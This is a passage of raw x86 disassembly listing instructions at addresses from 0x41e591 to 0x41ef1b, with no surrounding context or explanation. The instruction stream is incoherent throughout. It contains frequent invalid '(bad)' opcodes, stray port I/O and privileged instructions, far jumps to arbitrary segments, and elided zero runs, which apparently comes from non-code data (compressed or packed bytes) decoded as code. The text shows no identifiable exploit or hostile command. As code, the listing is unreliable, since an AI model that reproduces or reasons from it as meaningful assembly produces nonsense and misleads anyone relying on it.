  41e591:	push   ecx
  41e592:	and    al,0xa8
  41e594:	into   
  41e595:	cli    
  41e596:	adc    ebx,DWORD PTR [ebp-0x440aaa7c]
  41e59c:	test   BYTE PTR [eax],bh
  41e59e:	sub    eax,0x3c2c3910
  41e5a3:	test   eax,0xfa212d02
  41e5a8:	inc    edi
  41e5a9:	jnp    0x41e61a
  41e5ab:	stc    
  41e5ac:	retf   
  41e5ad:	clc    
  41e5ae:	xor    edi,DWORD PTR [ebx]
  41e5b0:	mov    dh,0x18
  41e5b2:	or     eax,0x618b0c78
  41e5b7:	adc    BYTE PTR [ebp+0x5f8c869e],bh
  41e5bd:	adc    bl,BYTE PTR ss:[eax]
  41e5c0:	mov    bh,0xe3
  41e5c2:	jmp    0x41e5c1
  41e5c4:	xor    BYTE PTR ds:[edi-0x73],ch
  41e5c8:	mov    bl,0xc
  41e5ca:	in     al,dx
  41e5cb:	mov    DWORD PTR [edx-0x38],ecx
  41e5ce:	or     eax,0xa4847013
  41e5d3:	outs   dx,DWORD PTR ds:[esi]
  41e5d4:	imul   ebp,DWORD PTR ds:0xdc6f331e,0x5e112ae5
  41e5de:	jae    0x41e564
  41e5e0:	mov    al,0xf4
  41e5e2:	jmp    0xeb470ff5
  41e5e7:	fsub   QWORD PTR [ebp-0x101d6703]
  41e5ed:	in     al,dx
  41e5ee:	and    eax,0xafede0f4
  41e5f3:	inc    edi
  41e5f4:	dec    esp
  41e5f5:	pop    edi
  41e5f6:	adc    ecx,esi
  41e5f8:	clc    
  41e5f9:	in     eax,dx
  41e5fa:	push   edi
  41e5fb:	pop    ss
  41e5fc:	and    eax,0x6e358529
  41e601:	in     al,dx
  41e602:	dec    edx
  41e603:	mov    edx,esi
  41e605:	dec    edx
  41e606:	sub    eax,0x830d012a
  41e60b:	mov    DWORD PTR [ecx+0xc],eax
  41e60e:	or     DWORD PTR [esp+ecx*8+0x130f3638],edi
  41e615:	sbb    cl,BYTE PTR [eax+eax*1]
  41e618:	inc    ecx
  41e619:	inc    ebx
  41e61a:	cmp    al,0xca
  41e61c:	dec    edx
  41e61d:	loope  0x41e625
  41e61f:	sbb    eax,0x1500d14c
  41e624:	cmp    eax,0xeccd8fd2
  41e629:	inc    ecx
  41e62a:	fst    QWORD PTR [ebp-0x2d]
  41e62d:	jo     0x41e5b0
  41e62f:	retf   
  41e630:	push   ebp
  41e631:	pop    esp
  41e632:	inc    eax
  41e633:	sti    
  41e634:	cdq    
  41e635:	into   
  41e636:	out    dx,eax
  41e637:	(bad)
  41e63a:	(bad)  
  41e63b:	in     eax,0x98
  41e63d:	inc    esi
  41e63e:	cmc    
  41e63f:	pop    esi
  41e640:	(bad)  
  41e641:	sar    BYTE PTR [esi-0x1aab22c1],0xca
  41e648:	cmp    eax,edx
  41e64a:	pop    esp
  41e64b:	test   BYTE PTR ds:0x66c0a03a,ah
  41e651:	cmp    eax,0x1c527367
  41e656:	outs   dx,DWORD PTR ds:[esi]
  41e657:	push   0x435e6228
  41e65c:	out    0xc1,eax
  41e65e:	sub    BYTE PTR ds:0xc3a29ee6,bl
  41e664:	retf   0x57dc
  41e667:	scas   al,BYTE PTR es:[edi]
  41e668:	inc    edi
  41e669:	jbe    0x41e6dc
  41e66b:	mov    al,0xc4
  41e66d:	shl    cl,cl
  41e66f:	dec    ecx
  41e670:	(bad)  
  41e671:	(bad)  
  41e672:	outs   dx,BYTE PTR ds:[esi]
  41e673:	ins    DWORD PTR es:[edi],dx
  41e674:	adc    ch,bl
  41e676:	outs   dx,BYTE PTR ds:[esi]
  41e677:	pop    ss
  41e678:	gs cmp al,0xc0
  41e67b:	jl     0x41e6d8
  41e67d:	push   0x10
  41e67f:	in     al,0xaf
  41e681:	jno    0x41e65a
  41e683:	(bad)
  41e686:	test   BYTE PTR [eax],0xc1
  41e689:	or     al,0xae
  41e68b:	pushf  
  41e68c:	bnd ret 
  41e68e:	adc    esi,DWORD PTR [ecx+0x29]
	...
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    esi,esi
  41e701:	repnz pop ebx
  41e703:	loope  0x41e711
  41e705:	inc    esp
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    eax,0x7b000001
  41e70d:	push   edi
  41e70e:	sbb    ecx,DWORD PTR [ecx-0x74]
  41e711:	das    
  41e712:	dec    ebx
  41e713:	popa   
  41e714:	mov    eax,0x4f9b2184
  41e719:	stos   BYTE PTR es:[edi],al
  41e71a:	das    
  41e71b:	iret   
  41e71c:	sub    BYTE PTR [ebp+0x3ad8f850],cl
  41e722:	mul    BYTE PTR [edi-0x16]
  41e725:	lods   eax,DWORD PTR ds:[esi]
  41e726:	lea    esp,[edx-0x24ef79b9]
  41e72c:	and    BYTE PTR [eax],al
  41e72e:	nop
  41e72f:	cmp    ah,BYTE PTR [ecx]
  41e731:	dec    eax
  41e732:	adc    eax,0xc1b1f857
  41e737:	fst    QWORD PTR [ecx+0x1f]
  41e73a:	jbe    0x6d44011f
  41e740:	fimul  WORD PTR ds:[edx+edx*8]
  41e744:	jle    0x41e73d
  41e746:	popa   
  41e747:	jp     0x41e7b7
  41e749:	adc    eax,0xe39b88fa
  41e74e:	test   BYTE PTR [ebx+0x4f],bl
  41e751:	mov    al,ds:0x94e8cb82
  41e756:	inc    esi
  41e757:	add    ebp,edx
  41e759:	push   cs
  41e75a:	pop    ebx
  41e75b:	cmp    al,0xd0
  41e75d:	sub    al,0x14
  41e75f:	and    BYTE PTR [ebx-0x1d1104a8],0xfa
  41e766:	pop    ebp
  41e767:	ins    DWORD PTR es:[edi],dx
  41e768:	stos   BYTE PTR es:[edi],al
  41e769:	call   0xa0b3bec8
  41e76e:	mov    ds:0x8a676671,al
  41e773:	mov    ch,0x2c
  41e775:	fmul   DWORD PTR [edx+0x39aed358]
  41e77b:	sti    
  41e77c:	cmp    DWORD PTR [eax+0x24ca1269],ebp
  41e782:	push   cs
  41e783:	xchg   esi,eax
  41e784:	pop    edx
  41e785:	push   cs
  41e786:	mov    ss,esi
  41e788:	aaa    
  41e789:	add    al,BYTE PTR [edx]
  41e78b:	ins    BYTE PTR es:[edi],dx
  41e78c:	test   DWORD PTR [edx+0x7d9de509],0xa62e0748
  41e796:	and    cl,0x2a
  41e799:	push   es
  41e79a:	xor    DWORD PTR [eax-0x2b7ba160],ebp
  41e7a0:	sub    BYTE PTR ds:0xa505c7a2,bh
  41e7a6:	pop    ebx
  41e7a7:	sbb    al,0x99
  41e7a9:	lods   al,BYTE PTR ds:[esi]
  41e7aa:	mul    DWORD PTR [ebp+0x37]
  41e7ad:	ins    DWORD PTR es:[edi],dx
  41e7ae:	gs mov ah,0xac
  41e7b1:	xlat   BYTE PTR ds:[ebx]
  41e7b2:	inc    edx
  41e7b3:	jnp    0x41e823
  41e7b5:	or     al,BYTE PTR [esi+0x22]
  41e7b8:	cmc    
  41e7b9:	add    BYTE PTR [edi+ebp*8],cl
  41e7bc:	mov    al,ds:0x1e2603f8
  41e7c1:	jecxz  0x41e7ba
  41e7c3:	ret    0x6714
  41e7c6:	push   DWORD PTR [esi-0x4c]
  41e7c9:	cmp    eax,0xbfa07f2c
  41e7ce:	loopne 0x41e795
  41e7d0:	mov    eax,ds:0xf74984f5
  41e7d5:	ja     0x41e7a0
  41e7d7:	cmp    esi,esi
  41e7d9:	sbb    al,0x42
  41e7db:	add    al,0x5
  41e7dd:	ins    BYTE PTR es:[edi],dx
  41e7de:	fld    DWORD PTR [eax]
  41e7e0:	sub    ax,0xe077
  41e7e4:	fs cmp eax,0x3fe48210
  41e7ea:	js     0x41e7d7
  41e7ec:	push   esp
  41e7ed:	xor    edx,0x23c677b7
  41e7f3:	pop    ds
  41e7f4:	push   0xffffffea
  41e7f6:	xor    al,0xe7
  41e7f8:	cmp    BYTE PTR [ebp-0x2a],al
  41e7fb:	xor    eax,0x8d8eee9e
  41e800:	and    al,0xd6
  41e802:	shl    BYTE PTR [ebx-0x64],cl
  41e805:	cmp    eax,0xa722a8b4
  41e80a:	dec    eax
  41e80b:	jg     0x41e824
  41e80d:	cmc    
  41e80e:	xor    BYTE PTR [esi+edx*1+0x0],cl
	...
  41e871:	add    BYTE PTR [eax],al
  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8ec
  41e881:	push   cs
  41e882:	mov    ecx,0x1451175
  41e887:	add    BYTE PTR ds:0x1e000001,al
  41e88d:	in     al,0xc5
  41e88f:	loopne 0x41e8b4
  41e891:	out    dx,eax
  41e892:	adc    esi,eax
  41e894:	push   eax
  41e895:	stos   DWORD PTR es:[edi],eax
  41e896:	lahf   
  41e897:	jmp    0x60b0:0x209d8a13
  41e89e:	(bad)  
  41e8a0:	xchg   DWORD PTR [eax],eax
  41e8a2:	cli    
  41e8a3:	and    edi,esi
  41e8a5:	ret    0xd18f
  41e8a8:	jae    0x41e8b7
  41e8aa:	cdq    
  41e8ab:	dec    edi
  41e8ac:	stos   BYTE PTR es:[edi],al
  41e8ad:	dec    ecx
  41e8ae:	push   esp
  41e8af:	cmp    eax,0x5d
  41e8b2:	lahf   
  41e8b3:	jg     0x41e857
  41e8b5:	mov    edi,DWORD PTR [esi+0x12]
  41e8b8:	mov    esp,0x3a83559f
  41e8bd:	xlat   BYTE PTR ds:[ebx]
  41e8be:	jmp    0x41e8be
  41e8c0:	inc    esi
  41e8c1:	push   ebp
  41e8c2:	dec    ebx
  41e8c3:	mov    esp,0xaa5bc913
  41e8c8:	popa   
  41e8c9:	scas   al,BYTE PTR es:[edi]
  41e8ca:	mov    bl,0x19
  41e8cc:	inc    ecx
  41e8cd:	cmp    esp,DWORD PTR [ebp-0xfc7af32]
  41e8d3:	fcomp  QWORD PTR [edx-0x5b]
  41e8d6:	push   cs
  41e8d7:	hlt    
  41e8d8:	stos   BYTE PTR es:[edi],al
  41e8d9:	out    dx,al
  41e8da:	or     eax,0x461ea6a5
  41e8df:	mov    bl,0xd7
  41e8e1:	repz test DWORD PTR [ebp+0x37],edx
  41e8e5:	push   edi
  41e8e6:	nop
  41e8e7:	mov    ebx,esi
  41e8e9:	adc    esp,DWORD PTR [ebp-0x79c94da1]
  41e8ef:	das    
  41e8f0:	mov    bh,0xbc
  41e8f2:	sar    ch,1
  41e8f4:	rol    DWORD PTR [edi-0x31],cl
  41e8f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8f8:	mov    dh,0xc
  41e8fa:	icebp  
  41e8fb:	push   eax
  41e8fc:	dec    ebx
  41e8fd:	inc    eax
  41e8fe:	scas   eax,DWORD PTR es:[edi]
  41e8ff:	adc    cl,dl
  41e901:	xchg   edx,eax
  41e902:	nop
  41e903:	dec    ebx
  41e904:	(bad)  
  41e905:	xchg   esp,eax
  41e906:	mov    al,ds:0xeabc6fcc
  41e90b:	mov    edi,0x68ba7094
  41e910:	xor    DWORD PTR [eax+0x5a],ebx
  41e913:	les    ecx,FWORD PTR [ecx-0x24]
  41e916:	or     DWORD PTR [ebx],esp
  41e918:	(bad)  
  41e91a:	push   cs
  41e91b:	push   0x2a519555
  41e920:	xor    esp,DWORD PTR [edx-0xd916def]
  41e926:	(bad)  
  41e927:	shr    cl,1
  41e929:	stc    
  41e92a:	fidivr DWORD PTR [eax+esi*4-0x68]
  41e92e:	sti    
  41e92f:	mov    DWORD PTR [ebx+0x7b],0x6d5e2db9
  41e936:	cmp    DWORD PTR [esi-0x1a],esp
  41e939:	or     BYTE PTR [edx-0x2a1baf1d],bl
  41e93f:	pop    esi
  41e940:	ins    DWORD PTR es:[edi],dx
  41e941:	test   dh,dh
  41e943:	lock int 0xfb
  41e946:	mov    ebx,0xffccb8a9
  41e94b:	aas    
  41e94c:	adc    DWORD PTR [ebx-0x66],ebp
  41e94f:	lahf   
  41e950:	or     eax,0x617d1971
  41e955:	retf   
  41e956:	jmp    FWORD PTR [ebp+0x3c]
  41e959:	dec    eax
  41e95a:	and    al,BYTE PTR [edi+0x2d]
  41e95d:	xchg   ecx,eax
  41e95e:	xchg   esi,eax
  41e95f:	pop    eax
  41e960:	addr16 in eax,dx
  41e962:	stos   DWORD PTR es:[edi],eax
  41e963:	mov    ah,0xf0
  41e965:	call   FWORD PTR [edi+0x1694733]
  41e96b:	xor    ebx,DWORD PTR [eax]
  41e96d:	cdq    
  41e96e:	gs out 0xa,ax
  41e972:	mov    ?,WORD PTR [ecx-0x150c21ed]
  41e978:	out    0x3f,al
  41e97a:	ret    
  41e97b:	jnp    0x41e96a
  41e97d:	loope  0x41e9db
  41e97f:	hlt    
  41e980:	fcmovnu st,st(4)
  41e982:	adc    DWORD PTR [ecx-0x7d],ebp
  41e985:	push   ecx
  41e986:	sub    BYTE PTR [esi+eax*1],dh
  41e989:	out    dx,al
  41e98a:	fld    QWORD PTR [ebx-0x8]
  41e98d:	adc    ecx,DWORD PTR [edx+0xd2f5]
	...
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	push   0x169f0809
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0x5000001
  41ea0d:	and    DWORD PTR [eax+0x1b],ebx
  41ea10:	fst    DWORD PTR [eax+eax*8-0x7c]
  41ea14:	add    al,0x9c
  41ea16:	inc    edi
  41ea17:	pop    ecx
  41ea18:	dec    esp
  41ea19:	cmp    BYTE PTR [edx-0xfcfb8ce],dh
  41ea1f:	xor    dl,BYTE PTR [ebx+ebx*1+0x41]
  41ea23:	cmc    
  41ea24:	jne    0x41e9bb
  41ea26:	cld    
  41ea27:	add    eax,0xa0dd8a4
  41ea2c:	jno    0x41ea57
  41ea2e:	or     edi,DWORD PTR [ebx]
  41ea30:	and    al,0xd0
  41ea32:	jg     0x41ea5f
  41ea34:	cld    
  41ea35:	inc    eax
  41ea36:	repnz leave 
  41ea38:	sub    DWORD PTR [eax-0x39],edx
  41ea3b:	or     ebp,DWORD PTR [ecx+0x15dfec15]
  41ea41:	mov    al,ds:0x2ab29be8
  41ea46:	out    0x30,al
  41ea48:	fld    DWORD PTR [ecx+0x5a36f52e]
  41ea4e:	bound  ebp,QWORD PTR [ebx-0x75]
  41ea51:	inc    ebx
  41ea52:	test   al,0xb6
  41ea54:	xor    ecx,DWORD PTR [ecx+0x6e8a47ec]
  41ea5a:	sub    al,0x75
  41ea5c:	fcom   DWORD PTR [eax]
  41ea5e:	mov    ecx,0xb855cfc
  41ea63:	in     eax,0x3e
  41ea65:	in     eax,dx
  41ea66:	les    edx,FWORD PTR [ebp-0x6e]
  41ea69:	icebp  
  41ea6a:	jno    0x41ea8f
  41ea6c:	outs   dx,DWORD PTR ds:[esi]
  41ea6d:	push   ss
  41ea6e:	lods   al,BYTE PTR ds:[esi]
  41ea6f:	test   DWORD PTR [ebx+0x30b45060],0x723cdd98
  41ea79:	sbb    bh,al
  41ea7b:	lock stos BYTE PTR es:[edi],al
  41ea7d:	sahf   
  41ea7e:	es test eax,0xa53b1b74
  41ea84:	mov    ss,WORD PTR [ecx-0x42]
  41ea87:	pop    es
  41ea88:	dec    eax
  41ea89:	clc    
  41ea8a:	(bad)  
  41ea8b:	mov    dl,0xc1
  41ea8d:	xor    al,0xe5
  41ea8f:	jbe    0x41ea24
  41ea91:	jp     0x41ead6
  41ea93:	rol    al,0xda
  41ea96:	mov    esi,DWORD PTR [esi+0x27]
  41ea99:	inc    ebp
  41ea9a:	sbb    al,0xf
  41ea9c:	mov    ds:0xe3edf18,eax
  41eaa1:	fist   DWORD PTR [ebx-0x13]
  41eaa4:	inc    ebp
  41eaa5:	lods   eax,DWORD PTR ds:[esi]
  41eaa6:	gs mov ebp,0x5cfbabbb
  41eaac:	sar    BYTE PTR [esi+0x54c8b22f],0xd6
  41eab3:	repz (bad) 
  41eab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eab6:	(bad)  
  41eab7:	test   DWORD PTR [ebp-0x80],0x9a98677a
  41eabe:	ror    BYTE PTR [ecx+edx*1],1
  41eac1:	mov    dl,0x1d
  41eac3:	dec    eax
  41eac4:	lea    edx,[ecx-0x48]
  41eac7:	mov    dl,0xf1
  41eac9:	add    edi,ebp
  41eacb:	push   ebp
  41eacc:	push   esi
  41eacd:	pop    esp
  41eace:	adc    eax,0xa725c597
  41ead3:	xchg   ecx,eax
  41ead4:	dec    ecx
  41ead5:	adc    ch,BYTE PTR [edx-0x6f]
  41ead8:	setb   BYTE PTR [esi]
  41eadb:	dec    ebx
  41eadc:	clc    
  41eadd:	push   cs
  41eade:	imul   esi,esi,0xa52672fe
  41eae4:	pop    esp
  41eae5:	pop    esp
  41eae6:	xor    cl,BYTE PTR [edx+0x16]
  41eae9:	mov    ebx,0x9628944f
  41eaee:	int    0x21
  41eaf0:	pop    ebp
  41eaf1:	ret    
  41eaf2:	dec    edx
  41eaf3:	xchg   ecx,eax
  41eaf4:	pop    ebp
  41eaf5:	pop    edi
  41eaf6:	mov    cl,0xda
  41eaf8:	mov    al,ds:0x2a29770f
  41eafd:	sub    eax,0x91ac660c
  41eb02:	arpl   WORD PTR [ecx],bp
  41eb04:	loope  0x41eb0d
  41eb06:	(bad)  
  41eb07:	xchg   ebp,eax
  41eb08:	push   es
  41eb09:	xor    edi,ebx
  41eb0b:	inc    ebp
  41eb0c:	xchg   BYTE PTR [esi+edx*2-0x14],cl
  41eb10:	add    eax,0x0
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x62
  41eb81:	cmp    eax,0x471b139f
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    eax,0x5e000001
  41eb8d:	int    0xa9
  41eb8f:	rcl    BYTE PTR [ecx+0x5d9839f2],cl
  41eb95:	test   al,0x74
  41eb97:	fimul  DWORD PTR [ebx+eax*4]
  41eb9a:	push   esi
  41eb9b:	cwde   
  41eb9c:	adc    ch,BYTE PTR [esi-0x1a]
  41eb9f:	rcr    BYTE PTR [ebx],1
  41eba1:	pop    esi
  41eba2:	(bad)  
  41eba3:	fld    TBYTE PTR [edx+ebp*8-0x7c]
  41eba7:	adc    dl,BYTE PTR ds:0xecdea96f
  41ebad:	imul   ebp
  41ebaf:	add    eax,0xb98de17
  41ebb4:	(bad)  
  41ebb5:	shl    BYTE PTR [edx+eax*8],1
  41ebb8:	pop    edx
  41ebb9:	ins    BYTE PTR es:[edi],dx
  41ebba:	call   0x4e17fa75
  41ebbf:	pusha  
  41ebc0:	outs   dx,BYTE PTR ds:[esi]
  41ebc1:	push   ds
  41ebc2:	sbb    bh,bh
  41ebc4:	or     al,BYTE PTR [edx]
  41ebc6:	out    dx,eax
  41ebc7:	inc    esp
  41ebc8:	mov    dh,0x2e
  41ebca:	adc    ch,BYTE PTR ds:0x5d5699e2
  41ebd0:	ds aaa 
  41ebd2:	and    eax,0xb2f9dcc3
  41ebd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebd8:	stos   DWORD PTR es:[edi],eax
  41ebd9:	imul   eax,DWORD PTR [ebp-0x3d],0xffffff88
  41ebdd:	mov    edx,0x59f6d4b4
  41ebe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebe3:	retf   0x4a8d
  41ebe6:	jg     0x41eb69
  41ebe8:	pop    edi
  41ebe9:	mov    WORD PTR [esi+esi*1+0x60b97a6f],fs
  41ebf0:	sub    DWORD PTR [esi],esi
  41ebf2:	clc    
  41ebf3:	mov    ebx,es
  41ebf5:	(bad)  
  41ebf7:	aam    0xff
  41ebf9:	jl     0x41ec5e
  41ebfb:	add    bl,BYTE PTR [ebx]
  41ebfd:	push   ebx
  41ebfe:	enter  0x799b,0x25
  41ec02:	popa   
  41ec03:	and    dh,BYTE PTR [edx]
  41ec05:	imul   ecx,edi,0xf1beacce
  41ec0b:	push   ebp
  41ec0c:	mov    eax,0xb77925d1
  41ec11:	fdivp  st(3),st
  41ec13:	(bad)  
  41ec14:	test   DWORD PTR gs:[ecx+0xa],edx
  41ec18:	inc    edx
  41ec19:	mov    ds:0xa6864596,al
  41ec1e:	xor    BYTE PTR [ebx],ah
  41ec20:	pop    ebp
  41ec21:	ffree  st(7)
  41ec23:	cmp    bl,BYTE PTR [ebx-0x65]
  41ec26:	out    dx,eax
  41ec27:	push   ds
  41ec28:	and    DWORD PTR [edi],0xffffff94
  41ec2b:	cli    
  41ec2c:	add    DWORD PTR [edx+0x685e7393],0x9d17357c
  41ec36:	test   DWORD PTR [edi],0xc58fe33c
  41ec3c:	loope  0x41ebe3
  41ec3e:	adc    DWORD PTR [ebx],ecx
  41ec40:	mov    edx,0x771a44da
  41ec45:	fwait
  41ec46:	or     dl,BYTE PTR [ebx+esi*2]
  41ec49:	in     al,0x4f
  41ec4b:	imul   DWORD PTR [ebp+0x44ab4bdd]
  41ec51:	and    DWORD PTR [ecx-0x6c102b3],ebp
  41ec57:	das    
  41ec58:	imul   esp,DWORD PTR [eax-0x68],0x36
  41ec5c:	mov    BYTE PTR [esi],bh
  41ec5e:	mov    edi,0x626e761d
  41ec63:	ss cmp eax,0x7e1ce22a
  41ec69:	adc    al,0x5c
  41ec6b:	call   FWORD PTR [esi-0x43353c0c]
  41ec71:	outs   dx,DWORD PTR ds:[esi]
  41ec72:	enter  0x6194,0x8c
  41ec76:	inc    esp
  41ec77:	sbb    edx,DWORD PTR [ecx-0x69f26941]
  41ec7d:	add    DWORD PTR [eax],esi
  41ec7f:	hlt    
  41ec80:	cmp    BYTE PTR es:[eax-0x76c6d5ee],0xb8
  41ec88:	aad    0x79
  41ec8a:	mov    ?,WORD PTR [edi+0x34db9a0d]
  41ec90:	ins    DWORD PTR es:[edi],dx
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x553d5fd0
  41ed02:	popa   
  41ed03:	(bad)  
  41ed04:	and    BYTE PTR [eax+0x1],cl
  41ed07:	add    BYTE PTR ds:0xa5000001,al
  41ed0d:	mov    ah,0x1c
  41ed0f:	cdq    
  41ed10:	cli    
  41ed11:	fimul  WORD PTR [edx]
  41ed13:	push   ebp
  41ed14:	pop    ebp
  41ed15:	sbb    ebx,DWORD PTR [esi+0x41c4fdf5]
  41ed1b:	jns    0x41ed3c
  41ed1d:	rcr    DWORD PTR [ebp-0x4c6cb014],0x5
  41ed24:	test   DWORD PTR [ebx-0x6a],edi
  41ed27:	sbb    DWORD PTR [edx],0x5f632ca9
  41ed2d:	test   BYTE PTR gs:[eax],ch
  41ed30:	xor    BYTE PTR [edi-0x69df9bbe],ch
  41ed36:	(bad)  
  41ed37:	lgs    esp,FWORD PTR [edx-0x39]
  41ed3b:	jmp    0x6edc:0x5f80ed48
  41ed42:	dec    edi
  41ed43:	(bad)  
  41ed44:	pushf  
  41ed45:	fwait
  41ed46:	lahf   
  41ed47:	(bad)  
  41ed48:	(bad)  
  41ed49:	cli    
  41ed4a:	fisub  DWORD PTR ss:[ebx]
  41ed4d:	das    
  41ed4e:	ins    BYTE PTR es:[edi],dx
  41ed4f:	popa   
  41ed50:	dec    ebp
  41ed51:	or     DWORD PTR [esi-0x4f91f0f0],esi
  41ed57:	sub    al,0x27
  41ed59:	std    
  41ed5a:	(bad)  
  41ed5b:	out    dx,eax
  41ed5c:	xchg   ebx,eax
  41ed5d:	cwde   
  41ed5e:	xchg   ecx,eax
  41ed5f:	jns    0x41ed37
  41ed61:	dec    esp
  41ed62:	lock adc BYTE PTR [ebx+0x16],ah
  41ed66:	mov    bh,0x6d
  41ed68:	mov    bh,0x87
  41ed6a:	mov    esp,0x632cd96
  41ed6f:	ds std 
  41ed71:	inc    ecx
  41ed72:	xlat   BYTE PTR ds:[ebx]
  41ed73:	add    ebx,DWORD PTR [esi+0x29]
  41ed76:	add    dh,BYTE PTR [edi]
  41ed78:	pop    esp
  41ed79:	jle    0x41ed1c
  41ed7b:	or     al,0xf4
  41ed7d:	mov    ebx,0x3e431d8a
  41ed82:	mov    ebp,0xc38ebfe2
  41ed87:	outs   dx,BYTE PTR ds:[esi]
  41ed88:	sbb    eax,DWORD PTR [edi]
  41ed8a:	push   ebp
  41ed8b:	or     BYTE PTR [eax],ch
  41ed8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed8e:	jg     0x41edcf
  41ed90:	mov    eax,0x8a99dba6
  41ed95:	les    esi,FWORD PTR [edx]
  41ed97:	pop    esi
  41ed98:	mov    es,esp
  41ed9a:	add    DWORD PTR [esp+eax*1+0x5e6b4803],edx
  41eda1:	mov    ch,0xea
  41eda3:	sub    eax,0xd3ad9e66
  41eda8:	sbb    BYTE PTR [ebp-0x1b385dbd],ah
  41edae:	xchg   BYTE PTR [ebx+0x58d2acdb],cl
  41edb4:	loopne 0x41ee01
  41edb6:	mov    cl,0x97
  41edb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edb9:	stos   BYTE PTR es:[edi],al
  41edba:	in     al,dx
  41edbb:	sbb    edi,DWORD PTR [eax-0x60543a32]
  41edc1:	(bad)  
  41edc3:	shl    DWORD PTR [eax],cl
  41edc5:	loope  0x41edcd
  41edc7:	sub    DWORD PTR [ebp+0x682dc4ec],edx
  41edcd:	jle    0x41edd5
  41edcf:	retf   
  41edd0:	adc    al,0xb7
  41edd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edd3:	out    dx,eax
  41edd4:	adc    BYTE PTR [edi],ch
  41edd6:	xchg   esi,eax
  41edd7:	outs   dx,DWORD PTR ds:[esi]
  41edd8:	push   ebp
  41edd9:	push   0x7445aa20
  41edde:	jl     0x41ede2
  41ede0:	out    0x4f,eax
  41ede2:	push   edx
  41ede3:	jmp    0xfca25819
  41ede8:	retf   
  41ede9:	ret    0x1e2e
  41edec:	add    al,0x9b
  41edee:	loope  0x41ee2f
  41edf0:	test   bh,0xb9
  41edf3:	in     eax,0x85
  41edf5:	fdivr  DWORD PTR [ebp-0x358c85ad]
  41edfb:	ins    DWORD PTR es:[edi],dx
  41edfc:	sti    
  41edfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edfe:	pop    esp
  41edff:	cmp    BYTE PTR [ebp+esi*1+0x63],0x4a
  41ee04:	adc    al,0x9b
  41ee06:	and    al,BYTE PTR [eax-0x7baf3c2f]
  41ee0c:	push   esi
  41ee0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee0e:	cld    
  41ee0f:	pusha  
  41ee10:	dec    edx
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x2547:0x408998e7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0xc7000001
  41ee8d:	(bad)  
  41ee8e:	pop    edi
  41ee8f:	sbb    eax,0x85670c12
  41ee94:	or     edx,edi
  41ee96:	or     BYTE PTR [ebp-0x233f41ec],0xf5
  41ee9d:	and    eax,0xb6d874c7
  41eea2:	push   0xffffff84
  41eea4:	sub    cl,BYTE PTR [ecx+esi*4-0x34724ea8]
  41eeab:	fnsave [ebx+0x377b037c]
  41eeb1:	jns    0x41eed1
  41eeb3:	arpl   cx,cx
  41eeb5:	shl    ah,cl
  41eeb7:	fdivr  DWORD PTR [esi+0x13]
  41eeba:	dec    ebp
  41eebb:	dec    eax
  41eebc:	inc    ecx
  41eebd:	jne    0x41eec4
  41eebf:	mov    ds:0x68b573cc,al
  41eec4:	lods   al,BYTE PTR ds:[esi]
  41eec5:	jnp    0x41eeb7
  41eec7:	iret   
  41eec8:	retf   0x1686
  41eecb:	cli    
  41eecc:	xor    al,0x4e
  41eece:	xchg   edi,eax
  41eecf:	hlt    
  41eed0:	mov    dh,0x24
  41eed2:	inc    DWORD PTR [edx+0x23210c90]
  41eed8:	stc    
  41eed9:	push   edi
  41eeda:	ja     0x41ee5d
  41eedc:	xchg   ebx,eax
  41eedd:	vminpd xmm6,xmm3,XMMWORD PTR [eax+ebp*8]
  41eee2:	inc    ebx
  41eee3:	popa   
  41eee4:	inc    edi
  41eee5:	imul   ebp,DWORD PTR [esi+edi*2+0x16],0x6f
  41eeea:	mov    eax,ds:0x5ecf0626
  41eeef:	popa   
  41eef0:	out    0x72,al
  41eef2:	je     0x41eed8
  41eef4:	dec    ebp
  41eef5:	xchg   edx,esi
  41eef7:	inc    ebx
  41eef8:	jmp    0xa1f6:0x84b035e3
  41eeff:	push   edx
  41ef00:	jno    0x41ef4f
  41ef02:	test   BYTE PTR [eax],cl
  41ef04:	sub    ah,BYTE PTR [eax]
  41ef06:	jne    0x41ef65
  41ef08:	in     al,0xc6
  41ef0a:	mov    al,0xa2
  41ef0c:	sub    BYTE PTR [edi-0x43],0x6b
  41ef10:	and    al,0x51
  41ef12:	mov    ah,0x1f
  41ef14:	rcl    BYTE PTR [edx+0x1173599d],0xff
  41ef1b:	popf   
